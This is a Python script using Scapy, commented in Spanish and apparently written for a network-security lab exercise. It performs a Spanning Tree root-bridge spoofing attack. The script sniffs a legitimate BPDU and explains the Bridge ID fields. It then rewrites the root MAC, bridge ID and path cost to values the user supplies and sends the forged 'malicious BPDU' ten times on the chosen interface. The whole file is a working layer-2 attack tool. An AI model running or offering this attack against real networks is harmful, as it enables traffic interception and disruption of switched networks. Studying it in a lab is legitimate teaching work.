#!/usr/bin/env python3
from scapy.all import *
import sys
import time
import re

# === Configuración de colores ANSI ===
RESET = "\033[0m"
BOLD = "\033[1m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
GRAY = "\033[90m"

SEPARATOR = "\n" + GRAY + "=" * 70 + RESET + "\n"

# Utilidad para mostrar banners estructurados
def ascii_banner(text):
    framed = f"| {text} |"
    line = "=" * len(framed)
    print(f"\n{GRAY}{line}\n{BOLD}{framed}{RESET}\n{GRAY}{line}{RESET}")

# Introducción del script
def intro():
    ascii_banner("INICIO DEL ATAQUE SPANNING TREE")
    print(f"{BLUE}[1]{RESET} Abre Wireshark y selecciona la interfaz '{BOLD}swX-p5-kaliX{RESET}'")
    print(f"{BLUE}[2]{RESET} Observa los paquetes STP legítimos emitidos desde Kali")
    print(f"{BLUE}[3]{RESET} Comprende su estructura antes de suplantar el root bridge")
    input(f"\n{BOLD}[ENTER]{RESET} Continuar cuando Wireshark esté capturando")

# Análisis y explicación de direcciones MAC del paquete STP
def explain_mac_addresses(pkt):
    print(SEPARATOR)
    print(f"{BOLD}[INFO]{RESET} Análisis del paquete STP capturado")
    print("\nIdentificar dos MAC importantes:")
    print("  (1) Kali (interfaz 'swX-p5-kali')")
    print("  (2) Switch legítimo conectado")
    print("\nPara obtenerlas:")
    print("  Kali   : 'ip link show'")
    print("  Switch : 'show system'")

    print("\nResumen del paquete:")
    print(f"  Origen     : {pkt.src}")
    print(f"  Destino    : {pkt.dst} (multicast STP 01:80:c2:00:00:00)")

    stp = pkt.getlayer(STP)
    print(f"  Root Bridge: {stp.rootmac}")
    print(SEPARATOR)

    print(f"{BOLD}Estructura del Bridge ID:{RESET}")
    print("  - 2 bytes: Prioridad (4 bits manual + 12 bits VLAN ID)")
    print("  - 6 bytes: MAC del bridge")
    print("  Ejemplo: 0x2000 + VLAN 1 = 0x2001")
    print("  Cuanto más bajo el valor, mayor prioridad tiene el bridge")
    print(SEPARATOR)
    ascii_banner("RESUMEN BPDU CAPTURADO")

# Solicita al usuario parámetros personalizados para el ataque
def ask_values():
    print(SEPARATOR)
    rootmac = input("Introduce la MAC del root bridge (spoof): ")
    bridgeid = input("Introduce el Bridge ID deseado (ej. 0x2001): ")
    rootpathcost = input("Introduce el path cost (ej. 0): ")
    return rootmac, bridgeid, rootpathcost

# Construye y envía el BPDU falso
def send_fake_bpdu(pkt, rootmac, bridgeid, rootpathcost):
    print(SEPARATOR)
    print(f"{BLUE}[ENVIANDO]{RESET} Modificando BPDU...")
    ether = pkt.getlayer(Ether)
    llc = pkt.getlayer(LLC)
    stp = pkt.getlayer(STP)

    stp.rootmac = rootmac
    stp.bridgeid = int(bridgeid, 16)
    stp.rootid = int(bridgeid, 16)
    stp.pathcost = int(rootpathcost)

    modified = Ether(src=ether.src, dst=ether.dst)/llc/stp

    print(f"{GREEN}[OK]{RESET} BPDU listo para envío")
    iface = conf.iface
    print(f"Enviando por interfaz: {iface}")

    sendp(modified, iface=iface, count=10, inter=1, verbose=0)
    print(f"{GREEN}[COMPLETADO]{RESET} BPDU malicioso enviado 10 veces.")

# Main
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"\nUso: {sys.argv[0]} <interfaz>")
        sys.exit(1)
    conf.iface = sys.argv[1]
    intro()
    print(SEPARATOR)
    print(f"{BLUE}[CAPTURA]{RESET} Esperando primer paquete STP...")
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", iface=conf.iface, count=1)[0]
    explain_mac_addresses(pkt)

    stp = pkt.getlayer(STP)
    print(f"\n{BOLD}BPDU Original:{RESET}")
    stp.show()

    rootmac, bridgeid, rootpathcost = ask_values()
    send_fake_bpdu(pkt, rootmac, bridgeid, rootpathcost)
